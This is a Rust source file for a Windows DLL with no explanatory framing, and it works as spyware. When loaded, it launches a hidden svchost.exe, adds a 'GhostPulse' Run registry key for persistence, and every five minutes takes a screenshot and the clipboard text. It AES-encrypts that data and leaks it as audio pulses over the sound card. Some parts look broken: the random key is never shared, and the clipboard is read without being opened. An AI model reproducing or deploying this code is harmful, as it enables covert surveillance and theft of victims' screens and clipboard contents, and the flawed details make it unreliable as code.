use openssl::symm::{Cipher, Crypter, Mode};
use rand::Rng;
use std::ptr;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use winapi::um::winuser::{GetDC, GetClipboardData, CF_TEXT};
use winapi::um::wingdi::{GetDIBits, BITMAPINFOHEADER, BI_RGB};
use winapi::um::processthreadsapi::{CreateProcessA};
use winapi::um::winbase::CREATE_NO_WINDOW;
use winapi::um::mmsystem::WAVEHDR;
use windows_sys::Win32::Media::Audio::{waveOutOpen, waveOutWrite, WAVEFORMATEX, HWAVEOUT};
use serde_json::json;
use base64::{engine::general_purpose, Engine as _};
use winapi::shared::minwindef::{HINSTANCE, DWORD, LPVOID, BOOL};
use winapi::um::winnt::DLL_PROCESS_ATTACH;

const BLOCK_SIZE: usize = 16;
const KEY_SIZE: usize = 32;
const SAMPLE_RATE: u32 = 44100;

fn data_enc(data: &[u8], key: &[u8], iv: &[u8]) -> Vec<u8> {
    let cipher = Cipher::aes_256_cbc();
    let mut crypter = Crypter::new(cipher, Mode::Encrypt, key, Some(iv)).unwrap();
    let mut output = vec![0; data.len() + BLOCK_SIZE];
    let mut count = crypter.update(data, &mut output).unwrap();
    count += crypter.finalize(&mut output[count..]).unwrap();
    output.truncate(count);
    output
}

fn exfiltration(data: &[u8], key: &[u8], iv: &[u8]) {
    let encrypted = data_enc(data, key, iv);
    let encoded = general_purpose::STANDARD.encode(&encrypted);

    let mut audio_buffer = Vec::with_capacity(encoded.len() * 2);
    for byte in encoded.as_bytes() {
        let pulse = if *byte > 127 { 32767i16 } else { -32768i16 };
        audio_buffer.push(pulse);
        audio_buffer.push(0);
    }

    let format = WAVEFORMATEX {
        wFormatTag: 1,
        nChannels: 1,
        nSamplesPerSec: SAMPLE_RATE,
        nAvgBytesPerSec: SAMPLE_RATE * 2,
        nBlockAlign: 2,
        wBitsPerSample: 16,
        cbSize: 0,
    };
    let mut h_wave_out: HWAVEOUT = 0;
    unsafe {
        waveOutOpen(&mut h_wave_out, 0, &format, 0, 0, 0);
        let header = WAVEHDR {
            lpData: audio_buffer.as_ptr() as *mut i8,
            dwBufferLength: (audio_buffer.len() * 2) as u32,
            dwBytesRecorded: 0,
            dwUser: 0,
            dwFlags: 0,
            dwLoops: 0,
            lpNext: ptr::null_mut(),
            reserved: 0,
        };
        waveOutWrite(h_wave_out, &header as *const _ as *mut _, std::mem::size_of::<WAVEHDR>() as u32);
    }
    thread::sleep(Duration::from_millis(encoded.len() as u64 * 10));
}

fn screenshotting() -> Vec<u8> {
    let dc = unsafe { GetDC(ptr::null_mut()) };
    let mut bi = BITMAPINFOHEADER {
        biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
        biWidth: 320,
        biHeight: 240,
        biPlanes: 1,
        biBitCount: 24,
        biCompression: BI_RGB,
        biSizeImage: 0,
        biXPelsPerMeter: 0,
        biYPelsPerMeter: 0,
        biClrUsed: 0,
        biClrImportant: 0,
    };
    let mut buffer = vec![0u8; (320 * 240 * 3) as usize];
    unsafe {
        GetDIBits(dc, ptr::null_mut(), 0, 240, buffer.as_mut_ptr() as *mut _, &mut bi as *mut _ as *mut _, 0);
    }
    buffer
}

fn capture_clipboard() -> Option<String> {
    unsafe {
        let clip_data = GetClipboardData(CF_TEXT);
        if clip_data.is_null() {
            return None;
        }
        let text = std::ffi::CStr::from_ptr(clip_data as *const i8);
        text.to_str().ok().map(String::from)
    }
}

fn process_spoofing() {
    let mut si = winapi::um::processthreadsapi::STARTUPINFOA {
        cb: std::mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOA>() as u32,
        ..unsafe { std::mem::zeroed() }
    };
    let mut pi = winapi::um::processthreadsapi::PROCESS_INFORMATION {
        ..unsafe { std::mem::zeroed() }
    };
    let cmd = b"C:\\Windows\\System32\\svchost.exe\0";
    unsafe {
        CreateProcessA(
            cmd.as_ptr() as *const i8,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            CREATE_NO_WINDOW,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut si,
            &mut pi,
        );
    }
}

fn persistence() -> std::io::Result<()> {
    let exe_path = std::env::current_exe()?;
    let reg_cmd = format!(
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v GhostPulse /t REG_SZ /d \"{}\" /f",
        exe_path.to_str().unwrap()
    );
    std::process::Command::new("cmd").args(&["/C", &reg_cmd]).output()?;
    Ok(())
}

fn run_logic(key: Vec<u8>, iv: Vec<u8>) {
    process_spoofing();
    if let Err(_) = persistence() {    
    }

    loop {
        let screenshot = screenshotting();
        let clipboard = capture_clipboard().unwrap_or_default();
        let data = json!({
            "screenshot": general_purpose::STANDARD.encode(&screenshot),
            "clipboard": clipboard,
            "timestamp": SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs(),
        }).to_string();

        exfiltration(data.as_bytes(), &key, &iv);
        thread::sleep(Duration::from_secs(300));
    }
}

#[no_mangle]
pub extern "system" fn DllMain(_hinst: HINSTANCE, reason: DWORD, _reserved: LPVOID) -> BOOL {
    match reason {
        DLL_PROCESS_ATTACH => {
            let mut rng = rand::thread_rng();
            let key: Vec<u8> = (0..KEY_SIZE).map(|_| rng.gen()).collect();
            let iv: Vec<u8> = (0..BLOCK_SIZE).map(|_| rng.gen()).collect();
            thread::spawn(move || {
                run_logic(key, iv);
            });
            1
        }
        _ => 1,
    }
}
